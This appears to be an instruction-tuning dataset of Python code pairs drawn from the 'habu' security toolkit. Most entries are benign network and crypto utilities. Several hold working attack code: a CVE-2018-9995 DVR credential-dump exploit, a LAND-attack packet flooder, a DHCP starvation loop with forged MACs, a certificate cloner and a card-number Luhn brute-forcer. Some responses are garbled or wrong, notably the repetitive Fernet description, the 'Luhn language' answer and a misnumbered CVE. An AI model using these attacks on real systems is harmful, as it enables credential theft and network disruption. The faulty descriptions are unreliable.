{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nextracts hostnames from a file or stdin.", "response": "def cmd_extract_hostname(infile, check, verbose, jsonout):\n    \"\"\"Extract hostnames from a file or stdin.\n\n    Example:\n\n    \\b\n    $ cat /var/log/some.log | habu.extract.hostname\n    www.google.com\n    ibm.com\n    fileserver.redhat.com\n    \"\"\"\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    data = infile.read()\n\n    result = extract_hostname(data)\n\n    if check:\n        logging.info('Checking against DNS...')\n        for candidate in result:\n            try:\n                socket.getaddrinfo(candidate, None)\n            except socket.gaierror:\n                result.remove(candidate)\n\n    if jsonout:\n        print(json.dumps(result, indent=4))\n    else:\n        print('\\n'.join(result))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_b64(f, do_decode):\n\n    data = f.read()\n\n    if not data:\n        print(\"Empty file or string!\")\n        return 1\n\n    if do_decode:\n        os.write(sys.stdout.fileno(), base64.b64decode(data))\n    else:\n        os.write(sys.stdout.fileno(), base64.b64encode(data))", "response": "This function is used to base64 encode or decode data in base64."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef cmd_shodan(ip, no_cache, verbose, output):\n\n    habucfg = loadcfg()\n\n    if 'SHODAN_APIKEY' not in habucfg:\n        print('You must provide a shodan apikey. Use the ~/.habu.json file (variable SHODAN_APIKEY), or export the variable HABU_SHODAN_APIKEY')\n        print('Get your API key from https://www.shodan.io/')\n        sys.exit(1)\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    data = shodan_get_result(ip, habucfg['SHODAN_APIKEY'], no_cache, verbose)\n\n    output.write(json.dumps(data, indent=4))\n    output.write('\\n')", "response": "Simple shodan API client."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets the geolocation of an IP adddress from https://ipapi. co.", "response": "def cmd_ip_geolocation(ip_address, verbose):\n    \"\"\"Get the geolocation of an IP adddress from https://ipapi.co/.\n\n    Example:\n\n    \\b\n    $ habu.ip.geolocation 8.8.8.8\n    {\n        \"ip\": \"8.8.8.8\",\n        \"city\": \"Mountain View\",\n        ...\n        \"asn\": \"AS15169\",\n        \"org\": \"Google LLC\"\n    }\n    \"\"\"\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n        print(\"Looking up %s...\" % ip_address, file=sys.stderr)\n\n    results = geo_location(ip_address)\n\n    if results:\n        print(json.dumps(results, indent=4))\n    else:\n        print(\"[X] %s is not valid IPv4 address\" % ip_address)\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef cmd_hasher(f, algorithm):\n\n    data = f.read()\n\n    if not data:\n        print(\"Empty file or string!\")\n        return 1\n\n    if algorithm:\n        print(hasher(data, algorithm)[algorithm], f.name)\n    else:\n        for algo, result in hasher(data).items():\n            print(\"{:<12} {} {}\".format(algo, result, f.name))", "response": "Compute various hashes for the input data."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nsending TCP packets with different flags and tell what responses receive.", "response": "def cmd_tcpflags(ip, port, flags, rflags, verbose):\n    \"\"\"Send TCP packets with different flags and tell what responses receives.\n\n    It can be used to analyze how the different TCP/IP stack implementations\n    and configurations responds to packet with various flag combinations.\n\n    Example:\n\n    \\b\n    # habu.tcpflags www.portantier.com\n    S  -> SA\n    FS -> SA\n    FA -> R\n    SA -> R\n\n    By default, the command sends all possible flag combinations. You can\n    specify which flags must ever be present (reducing the quantity of\n    possible combinations), with the option '-f'.\n\n    Also, you can specify which flags you want to be present on the response\n    packets to show, with the option '-r'.\n\n    With the next command, you see all the possible combinations that have\n    the FIN (F) flag set and generates a response that contains the RST (R)\n    flag.\n\n    Example:\n\n    \\b\n    # habu.tcpflags -f F -r R www.portantier.com\n    FPA  -> R\n    FSPA -> R\n    FAU  -> R\n    \"\"\"\n\n    conf.verb = False\n\n    pkts = IP(dst=ip) / TCP(flags=(0, 255), dport=port)\n\n    out = \"{:>8} -> {:<8}\"\n\n    for pkt in pkts:\n        if not flags or all(i in pkt.sprintf(r\"%TCP.flags%\") for i in flags):\n            ans = sr1(pkt, timeout=0.2)\n            if ans:\n                if not rflags or all(i in ans.sprintf(r\"%TCP.flags%\") for i in rflags):\n                    print(out.format(pkt.sprintf(r\"%TCP.flags%\"), ans.sprintf(r\"%TCP.flags%\")))\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef cmd_land(ip, count, port, iface, verbose):\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    layer3 = IP()\n    layer3.dst = ip\n    layer3.src = ip\n\n    layer4 = TCP()\n    layer4.dport = port\n    layer4.sport = port\n\n    pkt = layer3 / layer4\n\n    counter = 0\n\n    while True:\n        send(pkt)\n        counter += 1\n\n        if verbose:\n            print(pkt.summary())\n        else:\n            print('.', end='')\n            sys.stdout.flush()\n\n        if count != 0 and counter == count:\n            break\n\n    return True", "response": "This command implements the LAND attack that sends packets forging the source IP address to the same that the destination IP and the destination port."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nquery server with multiple entries.", "response": "def query_bulk(names):\n    \"\"\"Query server with multiple entries.\"\"\"\n    answers = [__threaded_query(name) for name in names]\n\n    while True:\n        if all([a.done() for a in answers]):\n            break\n        sleep(1)\n\n    return [answer.result() for answer in answers]"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef lookup_reverse(ip_address):\n    try:\n        type(ipaddress.ip_address(ip_address))\n    except ValueError:\n        return {}\n\n    record = reversename.from_address(ip_address)\n    hostname = str(resolver.query(record, \"PTR\")[0])[:-1]\n    return {'hostname': hostname}", "response": "Perform a reverse lookup of IP address."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nperforming a forward lookup of a hostname.", "response": "def lookup_forward(name):\n    \"\"\"Perform a forward lookup of a hostname.\"\"\"\n    ip_addresses = {}\n\n    addresses = list(set(str(ip[4][0]) for ip in socket.getaddrinfo(\n        name, None)))\n\n    if addresses is None:\n        return ip_addresses\n\n    for address in addresses:\n        if type(ipaddress.ip_address(address)) is ipaddress.IPv4Address:\n            ip_addresses['ipv4'] = address\n        if type(ipaddress.ip_address(address)) is ipaddress.IPv6Address:\n            ip_addresses['ipv6'] = address\n\n    return ip_addresses"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nchecking an IP against various Threat Intelligence and Reputation lists.", "response": "def cmd_karma(host):\n    \"\"\"Use the Karma service https://karma.securetia.com to check an IP\n    against various Threat Intelligence / Reputation lists.\n\n    \\b\n    $ habu.karma www.google.com\n    www.google.com -> 64.233.190.99\n    [\n        \"hphosts_fsa\",\n        \"hphosts_psh\",\n        \"hphosts_emd\"\n    ]\n\n    Note: You can use the hostname or the IP of the host to query.\n    \"\"\"\n\n    URL = 'https://karma.securetia.com/api/ip/'\n\n    try:\n        resolved = socket.gethostbyname(host)\n    except Exception:\n        logging.error('Invalid IP address or hostname')\n        sys.exit(1)\n\n    if host != resolved:\n        print(host, '->', resolved, file=sys.stderr)\n\n    r = requests.get(URL + resolved, headers={'Accept': 'application/json'})\n\n    if r.status_code != 200:\n        logging.error('HTTP Error code received: {}'.format(r.status_code))\n        sys.exit(1)\n\n    print(json.dumps(r.json(), indent=4))"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nsends a file to VirusTotal and print the report in JSON format.", "response": "def cmd_virustotal(input, verbose):\n    \"\"\"Send a file to VirusTotal https://www.virustotal.com/ and print the report in JSON format.\n\n    Note: Before send a file, will check if the file has been analyzed before (sending the\n    sha256 of the file), if a report exists, no submission will be made, and you will\n    see the last report.\n\n    \\b\n    $ habu.virustotal meterpreter.exe\n    Verifying if hash already submitted: f4826b219aed3ffdaa23db26cfae611979bf215984fc71a1c12f6397900cb70d\n    Sending file for analysis\n    Waiting/retrieving the report...\n    {\n        \"md5\": \"0ddb015b5328eb4d0cc2b87c39c49686\",\n        \"permalink\": \"https://www.virustotal.com/file/c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23/analysis/1526850717/\",\n        \"positives\": 49,\n        \"resource\": \"c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23\",\n        \"response_code\": 1,\n        \"scan_date\": \"2018-05-20 21:11:57\",\n        \"scan_id\": \"c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23-1526850717\",\n        \"scans\": {\n            \"ALYac\": {\n                \"detected\": true,\n                \"result\": \"Trojan.CryptZ.Gen\",\n                \"update\": \"20180520\",\n                \"version\": \"1.1.1.5\"\n            },\n            ... The other scanners ...\n        },\n        \"sha1\": \"5fa33cab1729480dd023b08f7b91a945c16d0a9e\",\n        \"sha256\": \"c9a2252b491641e15753a4d0c4bb30b1f9bd26ecff2c74f20a3c7890f3a1ea23\",\n        \"total\": 67,\n        \"verbose_msg\": \"Scan finished, information embedded\"\n    }\n    \"\"\"\n\n    habucfg = loadcfg()\n\n    if 'VIRUSTOTAL_APIKEY' not in habucfg:\n        logging.error('You must provide a virustotal apikey. Use the ~/.habu.json file (variable VIRUSTOTAL_APIKEY), or export the variable HABU_VIRUSTOTAL_APIKEY')\n        sys.exit(1)\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    filename = Path(input.name).name\n\n    data = input.read()\n\n    sha256 = hashlib.sha256(data).hexdigest()\n\n    logging.info('Verifying if hash already submitted: {}'.format(sha256))\n\n    params = {'apikey': habucfg['VIRUSTOTAL_APIKEY'], 'resource': sha256}\n    response = requests.post('https://www.virustotal.com/vtapi/v2/file/rescan', params=params)\n\n    if response.status_code != 200 or response.json()['response_code'] == 0:\n        logging.info('Sending file for analysis')\n        files = {'file': (filename, data)}\n        params = {'apikey': habucfg['VIRUSTOTAL_APIKEY']}\n        response = requests.post('https://www.virustotal.com/vtapi/v2/file/scan', files=files, params=params)\n        json_response = response.json()\n\n        resource = json_response['resource']\n\n    logging.info('Waiting/retrieving the report...')\n\n    while True:\n        params = {'apikey': habucfg['VIRUSTOTAL_APIKEY'], 'resource': sha256}\n        response = requests.get('https://www.virustotal.com/vtapi/v2/file/report', params=params)\n\n        if response.status_code == 200:\n            json_response = response.json()\n            if json_response['response_code'] == 1:\n                break\n\n        sleep(5)\n\n    print(json.dumps(json_response, indent=4, sort_keys=True))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cmd_crtsh(domain, no_cache, no_validate, verbose):\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    if not no_cache:\n        homedir = pwd.getpwuid(os.getuid()).pw_dir\n        requests_cache.install_cache(homedir + '/.habu_requests_cache', expire_after=3600)\n\n    subdomains = set()\n\n    if verbose:\n        print(\"Downloading subdomain list from https://crt.sh ...\", file=sys.stderr)\n\n    req = requests.get(\"https://crt.sh/?q=%.{d}&output=json\".format(d=domain))\n\n    if req.status_code != 200:\n        print(\"[X] Information not available!\")\n        exit(1)\n\n    json_data = json.loads(req.text)\n\n    for data in json_data:\n        name = data['name_value'].lower()\n        if '*' not in name:\n            subdomains.add(name)\n\n    subdomains = list(subdomains)\n\n    if no_validate:\n        print(json.dumps(sorted(subdomains), indent=4))\n        return True\n\n    if verbose:\n        print(\"Validating subdomains against DNS servers ...\", file=sys.stderr)\n\n    answers = query_bulk(subdomains)\n\n    validated = []\n\n    for answer in answers:\n        if answer:\n            validated.append(str(answer.qname))\n\n    print(json.dumps(sorted(validated), indent=4))\n    return True", "response": "Download the certificate transparency logs for a domain and check if each subdomain exists."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef cmd_dns_lookup_forward(hostname, verbose):\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n        print(\"Looking up %s...\" % hostname, file=sys.stderr)\n\n    answer = lookup_forward(hostname)\n\n    print(json.dumps(answer, indent=4))\n\n    return True", "response": "Perform a forward lookup of a given hostname."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nexploit the CVE - 2012 - 9995 vulnerability on various DVR systems.", "response": "def cmd_cve_2018_9995(ip, port, verbose):\n    \"\"\"Exploit the CVE-2018-9995 vulnerability, present on various DVR systems.\n\n    Note: Based on the original code from Ezequiel Fernandez (@capitan_alfa).\n\n    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995\n\n    Example:\n\n    \\b\n    $ python habu.cve.2018-9995 82.202.102.42\n    [\n        {\n            \"uid\": \"admin\",\n            \"pwd\": \"securepassword\",\n            \"role\": 2,\n            \"enmac\": 0,\n            \"mac\": \"00:00:00:00:00:00\",\n            \"playback\": 4294967295,\n            \"view\": 4294967295,\n            \"rview\": 4294967295,\n            \"ptz\": 4294967295,\n            \"backup\": 4294967295,\n            \"opt\": 4294967295\n        }\n    ]\n    \"\"\"\n\n    url = 'http://' + ip + ':' + str(port)\n    fullhost = url + '/device.rsp?opt=user&cmd=list'\n\n    headers = {\n        'Host': ip,\n        'User-Agent': 'Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)',\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        'Accept-Languag': 'es-AR,en-US;q=0.7,en;q=0.3',\n        'Connection': 'close',\n        'Content-Type': 'text/html',\n        'Cookie': 'uid=admin',\n    }\n\n    try:\n        r = requests.get(fullhost, headers=headers,timeout=10)\n    except Exception as e:\n        print('Exception:', e)\n        sys.exit(1)\n\n    try:\n        data = r.json()\n    except Exception as e:\n        print('Exception:', e)\n        sys.exit(1)\n\n    print(json.dumps(data[\"list\"], indent=4))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef run(self, block=True, binary=False, cwd=None):\n        self.blocking = block\n\n        # Use subprocess.\n        if self.blocking:\n            popen_kwargs = self._default_popen_kwargs.copy()\n            popen_kwargs['universal_newlines'] = not binary\n            if cwd:\n                popen_kwargs['cwd'] = cwd\n            s = subprocess.Popen(self._popen_args, **popen_kwargs)\n        # Otherwise, use pexpect.\n        else:\n            pexpect_kwargs = self._default_pexpect_kwargs.copy()\n            if binary:\n                pexpect_kwargs['encoding'] = None\n            if cwd:\n                pexpect_kwargs['cwd'] = cwd\n            # Enable Python subprocesses to work with expect functionality.\n            pexpect_kwargs['env']['PYTHONUNBUFFERED'] = '1'\n            s = PopenSpawn(self._popen_args, **pexpect_kwargs)\n        self.subprocess = s\n        self.was_run = True", "response": "Runs the given command with or without pexpect functionality enabled."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef expect(self, pattern, timeout=-1):\n\n        if self.blocking:\n            raise RuntimeError('expect can only be used on non-blocking commands.')\n\n        self.subprocess.expect(pattern=pattern, timeout=timeout)", "response": "Waits on the given pattern to appear in std_out."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef send(self, s, end=os.linesep, signal=False):\n\n        if self.blocking:\n            raise RuntimeError('send can only be used on non-blocking commands.')\n\n        if not signal:\n            if self._uses_subprocess:\n                return self.subprocess.communicate(s + end)\n            else:\n                return self.subprocess.send(s + end)\n        else:\n            self.subprocess.send_signal(s)", "response": "Sends the given string or signal to std_in."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nblock until process is complete.", "response": "def block(self):\n        \"\"\"Blocks until process is complete.\"\"\"\n        if self._uses_subprocess:\n            # consume stdout and stderr\n            try:\n                stdout, stderr = self.subprocess.communicate()\n                self.__out = stdout\n                self.__err = stderr\n            except ValueError:\n                pass  # Don't read from finished subprocesses.\n        else:\n            self.subprocess.wait()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nlisten for ARP packets and show information for each device.", "response": "def cmd_arp_sniff(iface):\n    \"\"\"Listen for ARP packets and show information for each device.\n\n    Columns: Seconds from last packet | IP | MAC | Vendor\n\n    Example:\n\n    \\b\n    1   192.168.0.1     a4:08:f5:19:17:a4   Sagemcom Broadband SAS\n    7   192.168.0.2     64:bc:0c:33:e5:57   LG Electronics (Mobile Communications)\n    2   192.168.0.5     00:c2:c6:30:2c:58   Intel Corporate\n    6   192.168.0.7     54:f2:01:db:35:58   Samsung Electronics Co.,Ltd\n    \"\"\"\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    print(\"Waiting for ARP packets...\", file=sys.stderr)\n\n    sniff(filter=\"arp\", store=False, prn=procpkt)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_web_tech(url, no_cache, verbose):\n\n    response = web_tech(url, no_cache, verbose)\n    print(json.dumps(response, indent=4))", "response": "Use Wappalyzer to identify technologies used on a web application."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cmd_tcpscan(ip, port, iface, flags, sleeptime, timeout, show_all, verbose):\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    port_regex = r'^[0-9,-]+$'\n\n    if not re.match(port_regex, port):\n        logging.critical(\"Invalid port specification\")\n        return False\n\n    ports = []\n\n    for p in str(port).split(','):\n        if '-' in p:\n            first, last = p.split('-')\n            for n in range(int(first), int(last)+1):\n                ports.append(n)\n        else:\n            ports.append(int(p))\n\n    out = \"{port} {sflags} -> {rflags}\"\n\n    pkts = IP(dst=ip)/TCP(flags=flags, dport=ports)\n\n    if sleeptime:\n        res = []\n        for pkt in pkts:\n            logging.info(pkt.summary())\n            _ = sr1(pkt)\n            if _:\n                logging.info(_.summary())\n                res.append((pkt, _))\n    else:\n        res, unans = sr(pkts, verbose=verbose)\n\n    for s,r in res:\n        if show_all or 'S' in r.sprintf(r\"%TCP.flags%\"):\n            print(out.format(\n                port=s[TCP].dport,\n                sflags=s.sprintf(r\"%TCP.flags%\"),\n                rflags=r.sprintf(r\"%TCP.flags%\")\n            ))", "response": "TCP Port Scanner.\n\n    Print the ports that generated a response with the SYN flag or (if show use -a) all the\n    ports that generated a response.\n\n    It's really basic compared with nmap, but who is comparing?\n\n    Example:\n\n    \\b\n    # habu.tcpscan -p 22,23,80,443 -s 1 45.77.113.133\n    22 S -> SA\n    80 S -> SA\n    443 S -> SA"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nperform a reverse lookup of a given IP address.", "response": "def cmd_dns_lookup_reverse(ip_address, verbose):\n    \"\"\"Perform a reverse lookup of a given IP address.\n\n    Example:\n\n    \\b\n    $ $ habu.dns.lookup.reverse 8.8.8.8\n    {\n        \"hostname\": \"google-public-dns-a.google.com\"\n    }\n    \"\"\"\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n        print(\"Looking up %s...\" % ip_address, file=sys.stderr)\n\n    answer = lookup_reverse(ip_address)\n\n    if answer:\n        print(json.dumps(answer, indent=4))\n    else:\n        print(\"[X] %s is not valid IPv4/IPV6 address\" % ip_address)\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nvalidating the number of items in the Luhn language.", "response": "def luhn_validate(number):\n    \"\"\" Source code from: https://en.wikipedia.org/wiki/Luhn_algorithm\"\"\"\n\n    sum = 0\n    parity = len(number) % 2\n    for i, digit in enumerate([int(x) for x in number]):\n        if i % 2 == parity:\n            digit *= 2\n            if digit > 9:\n                digit -= 9\n        sum += digit\n    return sum % 10 == 0"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nhave known values for a Luhn validated number, obtain the possible unknown numbers. Numbers that use the Luhn algorithm for validation are Credit Cards, IMEI, National Provider Identifier in the United States, Canadian Social Insurance Numbers, Israel ID Numbers and Greek Social Security Numbers (\u0391\u039c\u039a\u0391). The '-' characters are ignored. Define the missing numbers with the 'x' character. Reference: https://en.wikipedia.org/wiki/Luhn_algorithm Example: \\b $ habu.crack.luhn 4509-xxxx-3160-6445", "response": "def cmd_crack_luhn(number):\n    \"\"\"Having known values for a Luhn validated number, obtain the possible unknown numbers.\n\n    Numbers that use the Luhn algorithm for validation are Credit Cards, IMEI,\n    National Provider Identifier in the United States, Canadian Social\n    Insurance Numbers, Israel ID Numbers and Greek Social Security Numbers (\u0391\u039c\u039a\u0391).\n\n    The '-' characters are ignored.\n\n    Define the missing numbers with the 'x' character.\n\n    Reference: https://en.wikipedia.org/wiki/Luhn_algorithm\n\n    Example:\n\n    \\b\n    $ habu.crack.luhn 4509-xxxx-3160-6445\n    \"\"\"\n\n    number = number.replace('-', '')\n    unknown_count = number.count('x')\n\n    if not number.replace('x', '').isdigit():\n        print('Invalid format. Please, read the documentation.', file=sys.stderr)\n        sys.exit(1)\n\n    for n in range(10 ** unknown_count):\n        candidate = number\n        for item in '{:0{count}}'.format(n, count=unknown_count):\n            candidate = candidate.replace('x', item, 1)\n        if luhn_validate(candidate):\n            print(candidate)"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nclone a certificate chain.", "response": "def certclone(chain, copy_extensions=False):\n\n    for i in range(len(chain)):\n        chain[i] = chain[i].to_cryptography()\n\n    newchain = []\n\n    '''\n    key = rsa.generate_private_key(\n        public_exponent=65537,\n        key_size=2048,\n        backend=default_backend()\n        )\n\n    pubkey = key.public_key()\n    '''\n\n    first = True\n\n    for original in chain[::-1]:\n\n        #print(cert)\n\n        key = rsa.generate_private_key(\n            public_exponent=65537,\n            key_size=2048,\n            backend=default_backend()\n            )\n\n        key_pem = key.private_bytes(\n            encoding=serialization.Encoding.PEM,\n            format=serialization.PrivateFormat.TraditionalOpenSSL,\n            encryption_algorithm=serialization.NoEncryption()\n        ).decode()\n\n        if first:\n            print(key_pem)\n            first=False\n\n        pubkey = key.public_key()\n\n        # Todo: Code to mimic the private key type of original cert\n        # maybe based on pubkey.__class__\n        cert = x509.CertificateBuilder()\n        cert = cert.subject_name(original.subject)\n        cert = cert.issuer_name(original.issuer)\n        #cert = cert.serial_number(original.serial_number)\n        cert = cert.serial_number(x509.random_serial_number())\n        cert = cert.not_valid_before(original.not_valid_before)\n        cert = cert.not_valid_after(original.not_valid_after)\n        cert = cert.public_key(pubkey)\n\n        if copy_extensions:\n            for ext in original.extensions:\n                cert = cert.add_extension(ext.value, critical=ext.critical)\n\n        cert = cert.sign(private_key=key, algorithm=original.signature_hash_algorithm, backend=default_backend())\n        cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()\n        print(cert_pem)\n\n        newchain.insert(0, cert)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef cmd_protoscan(ip, iface, timeout, all_protocols, verbose):\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    if all_protocols:\n        protocols = (0,255)\n    else:\n        # convert \"{name:num}\" to {num:name}\"\n        protocols = { num:name for name,num in conf.protocols.__dict__.items() if isinstance(num, int) }\n\n    ans,unans=sr(IP(dst=ip, proto=protocols.keys())/\"SCAPY\", retry=0, timeout=timeout, verbose=verbose)\n\n    allowed_protocols = [ pkt['IP'].proto for pkt in unans ]\n\n    for proto in sorted(allowed_protocols):\n        print('{:<4} {}'.format(proto, protocols[proto]))", "response": "Send IP packets with different protocol field content to guess what protocols are available."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef cmd_http_options(server, verbose):\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    if verbose:\n        print(\"[-] Retrieving the HTTP headers of the server...\")\n\n    options = get_options(server)\n\n    if type(options) is dict:\n        print(json.dumps(options, indent=4))\n        if verbose:\n            print(\"[+] HTTP options from {} retrieved\".format(server))\n    else:\n        print(\"[X] {}\".format(options), file=sys.stderr)\n\n    return True", "response": "Retrieve the available HTTP methods of a web server."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cmd_arp_ping(ip, iface, verbose):\n\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    res, unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=ip), timeout=2)\n\n    for _, pkt in res:\n        if verbose:\n            print(pkt.show())\n        else:\n            print(pkt.summary())", "response": "Send ARP packets to check if a host is alive in the local network."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nshow the current config.", "response": "def cmd_config_show(option, show_keys):\n    \"\"\"Show the current config.\n\n    Note: By default, the options with 'KEY' in their name are shadowed.\n\n    Example:\n\n    \\b\n    $ habu.config.show\n    {\n        \"DNS_SERVER\": \"8.8.8.8\",\n        \"FERNET_KEY\": \"*************\"\n    }\n    \"\"\"\n\n    habucfg = loadcfg()\n\n    if not show_keys:\n        for key in habucfg.keys():\n            if 'KEY' in key:\n                habucfg[key] = '*************'\n\n    print(json.dumps(habucfg, indent=4, sort_keys=True, default=str))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsends multiple DHCP requests from forged MAC addresses to the DHCP server leases.", "response": "def cmd_dhcp_starvation(iface, timeout, sleeptime, verbose):\n    \"\"\"Send multiple DHCP requests from forged MAC addresses to\n    fill the DHCP server leases.\n\n    When all the available network addresses are assigned, the DHCP server don't send responses.\n\n    So, some attacks, like DHCP spoofing, can be made.\n\n    \\b\n    # habu.dhcp_starvation\n    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.6:bootpc / BOOTP / DHCP\n    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.7:bootpc / BOOTP / DHCP\n    Ether / IP / UDP 192.168.0.1:bootps > 192.168.0.8:bootpc / BOOTP / DHCP\n    \"\"\"\n\n    conf.verb = False\n\n    if iface:\n        conf.iface = iface\n\n    conf.checkIPaddr = False\n\n    ether = Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    ip = IP(src=\"0.0.0.0\",dst=\"255.255.255.255\")\n    udp = UDP(sport=68, dport=67)\n    dhcp = DHCP(options=[(\"message-type\",\"discover\"),\"end\"])\n\n    while True:\n        bootp = BOOTP(chaddr=str(RandMAC()))\n        dhcp_discover = ether / ip / udp / bootp / dhcp\n        ans, unans = srp(dhcp_discover, timeout=1)      # Press CTRL-C after several seconds\n\n        for _, pkt in ans:\n            if verbose:\n                print(pkt.show())\n            else:\n                print(pkt.sprintf(r\"%IP.src% offers %BOOTP.yiaddr%\"))\n\n        sleep(sleeptime)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cmd_http_headers(server, verbose):\n    if verbose:\n        logging.basicConfig(level=logging.INFO, format='%(message)s')\n\n    if verbose:\n        print(\"[-] Retrieving the HTTP headers of the server...\")\n\n    headers = get_headers(server)\n\n    if headers is not False:\n        print(json.dumps(headers, indent=4))\n    else:\n        print(\"[X] URL {} is not valid!\", file=sys.stderr)\n\n    if verbose:\n        print(\"[+] HTTP headers from {} retrieved\".format(server))\n\n    return True", "response": "Retrieve the HTTP headers of a web server."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef cmd_fernet(key, decrypt, ttl, i, o):\n\n    habucfg = loadcfg()\n\n    if not key:\n        if 'FERNET_KEY' in habucfg:\n            key = habucfg['FERNET_KEY']\n        else:\n            print(ERROR_NOKEY, file=sys.stderr)\n            sys.exit(1)\n\n    if not ttl:\n        ttl=None\n\n    cipher = Fernet(key)\n\n    data = i.read()\n\n    if decrypt:\n        try:\n            token = cipher.decrypt(data, ttl)\n        except Exception as e:\n            print(\"Error decrypting\", file=sys.stderr)\n            sys.exit(1)\n    else:\n        token = cipher.encrypt(data)\n\n    print(token.decode(), end='')", "response": "Fernet cipher. Fernet cipher. Fernet cipher. Fernet cipher uses HMAC - 128 - CBC with HMAC - 128 - CBC with AES - 128 - CBC with HMAC - 128 - CBC with HMAC - 128 - CBC with HMAC - 128 - CBC with HMAC - 128 - CBC"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating a new Fernet Key", "response": "def cmd_fernet_genkey(writecfg):\n    \"\"\"Generate a new Fernet Key, optionally write it to ~/.habu.json\n\n    Example:\n\n    \\b\n    $ habu.fernet.genkey\n    xgvWCIvjwe9Uq7NBvwO796iI4dsGD623QOT9GWqnuhg=\n    \"\"\"\n\n    key = Fernet.generate_key()\n    print(key.decode())\n\n    if writecfg:\n        habucfg = loadcfg(environment=False)\n        habucfg['FERNET_KEY'] = key.decode()\n        with Path('~/.habu.json').expanduser().open('w') as f:\n            f.write(json.dumps(habucfg, indent=4, sort_keys=True))"}
